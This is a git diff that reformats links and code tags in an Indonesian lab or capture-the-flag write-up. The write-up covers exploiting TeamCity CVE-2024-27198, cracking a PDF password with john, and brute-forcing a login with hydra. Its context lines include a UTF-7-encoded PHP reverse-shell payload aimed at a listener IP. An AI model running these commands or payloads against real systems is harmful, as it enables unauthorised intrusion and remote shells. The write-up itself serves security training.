@@ -101,11 +101,11 @@ nmap -p 8111 -sVC -v -oN output_scan_port_8111.txt 10.1.2.233
 
 * Setelah saya coba open port **8111** di web browser, terdapat info menarik yaitu tampil halaman login **JetBrains TeamCity versi 2023.11.3**.
 * Tanpa pikir panjang, saya langsung mencari tau apakah versi tersebut ada CVE-nya atau tidak.
-* Dari hasil pencarian, ditemukan bahwa **JetBrains TeamCity versi 2023.11.3** terdapat kerentanan _**Authentication Bypass to RCE**_, yang mana mengizinkan attacker bisa login tanpa menggunakan akun yang sah/terdaftar di sistem (lebih lengkapnya baca artikel ini: https://www.vicarius.io/vsociety/posts/teamcity-auth-bypass-to-rce-cve-2024-27198-and-cve-2024-27199).
+* Dari hasil pencarian, ditemukan bahwa **JetBrains TeamCity versi 2023.11.3** terdapat kerentanan _**Authentication Bypass to RCE**_, yang mana mengizinkan attacker bisa login tanpa menggunakan akun yang sah/terdaftar di sistem (lebih lengkapnya baca artikel ini: [https://www.vicarius.io/vsociety/posts/teamcity-auth-bypass-to-rce-cve-2024-27198-and-cve-2024-27199](https://www.vicarius.io/vsociety/posts/teamcity-auth-bypass-to-rce-cve-2024-27198-and-cve-2024-27199)).
 
 <figure><img src=".gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
 
-* Kemudian saya cari script POC yang mungkin orang lain pernah buat, dan ternyata saya menemukannya dari repo GitHub berikut: https://github.com/W01fh4cker/CVE-2024-27198-RCE.
+* Kemudian saya cari script POC yang mungkin orang lain pernah buat, dan ternyata saya menemukannya dari repo GitHub berikut: [https://github.com/W01fh4cker/CVE-2024-27198-RCE](https://github.com/W01fh4cker/CVE-2024-27198-RCE).
 * Saya coba jalankan script tersebut menggunakan command:
 
 ```bash
@@ -299,7 +299,7 @@ pdf2john "Audit Report (3).pdf" > audit_report_3.hash
 
 * Setelah itu, tinggal crack saja menggunakan tool: `john`.
 
-```purebasic
+```bash
 john --show --format=PDF audit_report_3.hash
 ```
 
@@ -323,7 +323,7 @@ john --show --format=PDF audit_report_3.hash
 
 #### 2.5. Finding the Secrets
 
-* Diketahui bahwa aplikasi yang berjalan di port **8080** dan dibuat menggunakan **CodeIgniter 4** (PHP-based framework).
+* Diketahui bahwa aplikasi yang berjalan di port **8080** dan dibuat menggunakan **CodeIgniter 4** (PHP-based web framework).
 * Ketika dibuka, muncul halaman login. Langsung saja saya coba brute force login http-form menggunakan informasi user dan password yang sudah diperoleh sebelumnya menggunakan tool: `hydra` dengan provide list user dan password yang telah diketahui sebelumnya.
 
 {% tabs %}
@@ -361,7 +361,7 @@ hydra -L users.txt -P pass.txt -s 8080 10.1.2.232 http-post-form "/authenticate:
 
 {% tabs %}
 {% tab title=".env" %}
-```
+```php
 #--------------------------------------------------------------------
 # Example Environment Configuration file
 #
@@ -462,7 +462,7 @@ database.default.port = 3306
 +ADw-?php exec("bash -i +AD4-& /dev/tcp/10.18.200.127/4444 0+AD4-&1") ?+AD4-
 ```
 
-* Untuk tanda `<` di-encode ke `UTF-7` menjadi: `+ADw-`. Dan tanda `>` menjadi: `+AD4-` (lebih lengkapnya baca artikel berikut: https://stackoverflow.com/questions/77609263/convert-utf-8-to-utf-7-in-python).
+* Untuk tanda `<` di-encode ke `UTF-7` menjadi: `+ADw-`. Dan tanda `>` menjadi: `+AD4-` (lebih lengkapnya baca artikel berikut: [https://stackoverflow.com/questions/77609263/convert-utf-8-to-utf-7-in-python](https://stackoverflow.com/questions/77609263/convert-utf-8-to-utf-7-in-python)).
 * Tetapi, setelah coba di upload masih gagal, karena kenapa ? karena by default ekstensinya adalah `.asp` (agak menjengkelkan sih ini wkwk). Hal itu dibuktikan dengan fungsi `phpinfo()` yang tetap berjalan meskipun ekstensi filenya `.asp`.
 * Oke fix upload dan jangan lupa untuk listen ke port `4444` menggunakan `nc`.
 
